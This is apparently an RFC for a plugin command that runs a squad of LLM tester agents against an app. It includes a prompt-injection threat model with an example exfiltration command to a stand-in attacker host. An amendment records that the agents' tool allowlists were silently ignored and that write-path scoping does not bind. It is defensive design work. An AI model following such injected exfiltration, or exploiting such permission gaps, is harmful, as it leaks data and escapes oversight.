# RFC 0006: /uberdev:testers — Adversarial Multi-Persona QA Audit Squad

**Status:** Draft
**Author:** flackplay (TheFJK)
**Targets:** uberdev plugin v0.30+
**Tier:** medium-large (1 command + 1 skill + 8 agents + fixture + tests)
**Spec:** `docs/uberdev/specs/2026-05-21-testers-command-design.md`

## Summary

A new slash command `/uberdev:testers` that spawns an 8-agent read-only QA audit squad (6 distinct-persona testers + 2 monitor agents) across 3 coordinated waves against an auto-detected target (web / api / native / all). Findings are evidence-anchored against a 10-invariant oracle library and filed as GitHub issues via the existing `findings-to-issues` pipeline.

## Motivation

uberdev has static reviewers (`pr-test-analyzer`, `silent-failure-hunter`) but no command that exercises the running app like a real user. Research (full notes in the spec) shows multi-persona diversity beats single-agent self-critique, and that 7 documented LLM-tester failure modes (optimistic-pass, hallucinated bugs, silent failure, cascading hallucination, loop traps, sycophancy, shared-session pollution) demand a structured defense — invariant-based oracles, evidence anchors, and a separate-prompt critic. This RFC implements that defense as a first-class command.

## Design

See spec for the full design. Key choices, locked from brainstorm:

- Auto-detect target surface (web/api/native/all)
- Local report + auto-file GitHub issues via `findings-to-issues`
- Unattended via dispatch backend (claude-bg/wezterm/background per RFC 0004); `--watch` flag runs inline
- 6 personas + 2 monitors = 8 agents per wave; 3 waves per run = 24 agent dispatches per run
- Wave-based monitor → persona communication (monitor reads previous wave, generates per-persona follow-ups)
- **Read-only audit** — every agent card declares a `tools:` whitelist (the key the agent loader honours) and none of the eight names `Edit`, so the loader withholds it. That is a tool-NAME ceiling and the whole of what a card can impose: the personas keep a `Write` no card confines to a directory, so "read-only on app code" is a contract the squad is held to rather than a restriction that stops it — see the #749 amendment under §Risks
- No early-stop; all personas run to budget (`max_actions: 200`, `max_clock_seconds: 300` per persona-wave)

## Alternatives considered

- In-session waves only (no backgrounding) — rejected; occupies session 15–30min.
- Live shared-findings-file polling — rejected; Claude subagents don't poll reliably mid-run.
- Cascading monitor-as-orchestrator — rejected; debug surface explodes.
- 2-persona lean squad — rejected per user's maximalist choice.
- Auto-fix mode — rejected; squad is intentionally read-only.

## Migration

None. New command, no breaking changes. Add `/testers` alias to `aliases-sync.sh` array (one new row).

## Risks

- **Cost:** 24 agent dispatches per run, monitor-primary on Opus. Mitigation: existing `fanout_concurrency` envvar pattern; cap per-wave fan-out via `UBERDEV_TESTERS_FANOUT` (default 8, matching wave size).
- **Prod blast radius:** an unconstrained run against a prod URL would hammer it. Mitigation: `prod_url_patterns` refusal in `.uberdev/config.yaml`. `--rps-cap` (default 10) is *enforced* for `Bash(curl*)` traffic via `lib/rate-limit-curl.sh` (token-bucket, per-host, `mkdir`-mutex over `.uberdev/research/$RUN_ID/testers/.rate-state/<host>/`) and *audited post-hoc* for browser-MCP / Playwright traffic (`lib/rate-cap-audit.sh` walks `wave-N.yaml.findings[].evidence.network_request.timestamp`, computes per-host rolling 1-second RPS, fails the run on breach).
- **Hallucinated bugs:** see spec section 8; defenses are evidence-anchor requirement + invariant_violated requirement + cross-persona confirmation.
- **Egress / prompt-injection exfil:** the 6 persona agents allow `Bash(curl*)` so they can replay requests, probe headers, and follow redirects against arbitrary audit targets (localhost, staging, user-supplied URLs). A hijacked prompt could in principle invoke `curl https://attacker.example/?leak=...`. Mitigations: (a) the audit target is supplied by the operator on a deliberate `/uberdev:testers` invocation — not auto-triggered; (b) `--rps-cap` (default 10) provides hard pre-emptive enforcement at the curl-wrapper layer (`lib/rate-limit-curl.sh`) and post-hoc audit + fail-the-run enforcement for browser-MCP traffic that cannot be HTTP-wrapped. `max_clock_seconds: 300` per persona-wave bounds the *temporal* exfil surface; together they bound exfil bandwidth to ≤ `RPS_CAP × 300 = 3000 requests per persona-wave` (default). Note: the audit fires *after* a breach has occurred — there is a single-wave detection latency for the browser-MCP surface, which is acceptable because the breach already constitutes a failed-run condition. Pre-emptive enforcement for MCP traffic would require a CDP-level interceptor and is out of scope. (c) the read-only contract (no `Edit`, scoped `Write(.uberdev/research/*)`) means an injected prompt cannot pivot to credential theft from the repo; (d) operators auditing third-party prompts should run the squad in a sandboxed shell with no `~/.aws`, `~/.ssh`, or `~/.config/gh` access on the user the agent runs as.

> **Amendment (2026-08-23, #749).** Mitigation (c) above was NOT in force between this RFC's implementation and #749. All eight `testers-*` agent cards declared their allowlist under `allowed-tools:`, which is the slash-command frontmatter key; an agent card is read for `tools:`, so the loader ignored the declaration and every persona ran with all tools — including `Edit` and unrestricted `Write` over the repository, the one grant this design says they must not hold. The guard did not see it either: `tests/testers-agent-contract.test.sh` C5 grepped the same ignored key and returned clean when it was absent. #749 moves all eight declarations onto `tools:`, re-points C5 at `tools:` and gives it a mutation row that proves it can fail, and adds a policy-to-frontmatter cross-check to `tests/model-routing.test.sh` so the `sandbox_ceiling` field is compared against the cards instead of only against itself. The write grant is corrected in the same change rather than carried across verbatim: the single-segment `Write(.uberdev/research/*)` named in (c) above does not admit the path the runtime actually hands a persona — `.uberdev/research/<RUN_ID>/testers/scratch/<persona>/out.yaml`, four segments deeper — so enforcing that pattern as written would have denied the one write these agents make, which is the squad's entire evidence channel. What lands is `Write(.uberdev/research/**)`, the pattern that does admit it — but that records which text the card carries, not what binds at runtime; the paragraph below draws that line, because only half of (c) comes back. The remaining agents whose `read-only` ceiling is still unprojected — the six Phase 1 review lenses among them — are named in the shrink-only waiver in that cross-check; any list written for them has to include `Write` rather than deny it, because they write a result file `/uberdev:review-pr` validates from disk — and, per the paragraph below, a scope inside its parentheses would narrow nothing anyway.
>
> **What the migration restores, and what it does not.** Moving the eight declarations onto the honoured key restores a *tool-name* restriction, and that is the whole of it: the loader now reads the list, so a persona's roster is the tools its card names and nothing more — `Edit` is not among them, where for the whole preceding window every persona held every tool. It does **not** restore the path scoping (c)'s parenthetical describes. A `tools:` entry filters tool *names*; the pattern inside its parentheses is not matched against a filesystem path, so `Write(.uberdev/research/**)` grants the `Write` tool and confines it to no directory. Nor can the missing half be supplied as a file-permission rule of that shape — the runtime rejects the spelling outright: *"`Write(...)` is not matched by file permission checks — only `Edit(path)` rules are. Use `Edit(...)` instead (`Edit` rules cover all file-editing tools)."* Under `--dangerously-skip-permissions`, the mode this repo actually runs, a persona carrying a `Write(.uberdev/research/*)` scope was observed during #749 writing outside that directory. (#749 established what a parenthetical means for `Write` only; it did not establish what a `Bash(...)` pattern narrows, so nothing here is a bound on what a persona can do *through* the tools it does still hold.)
>
> So (c) comes back in half. The half that lands is real and is what this amendment records: the window in which the allowlist was ignored entirely is closed. The other half was never in force, and no agent-card key can put it in force — the only shape file-permission checks match is `Edit(<pattern>)`, which is a permission rule rather than a card grant. Adopting one is out of scope for #749, and it is not a drop-in either: the shape the checker matches is named for the very tool the §Design read-only bullet says these agents must not hold, so reconciling the two is a decision this amendment defers rather than makes. Until it is made the residual gap stands — nothing in the cards stops a hijacked persona from writing anywhere in the repository — and mitigations (a), (b) and (d) are what remain load-bearing against it.

## Integration

- Reuses `lib/dispatch.sh` (RFC 0004), `findings-to-issues` agent, reviewer YAML contract, `.uberdev/research/$RUN_ID/` artifact convention.
- New: one command file, one skill, eight agent files, one buggy-app fixture, two test files.
- **Runtime dep:** PyYAML (`pip install pyyaml`). `aggregate.py` and `report.py` import `yaml`; Phase 0 of `SKILL.md` runs a `python3 -c "import yaml"` precheck and exits 2 with a clear stderr line if missing. PyYAML is already pulled in transitively by most Python toolchains; the precheck only fires on a stripped python3.
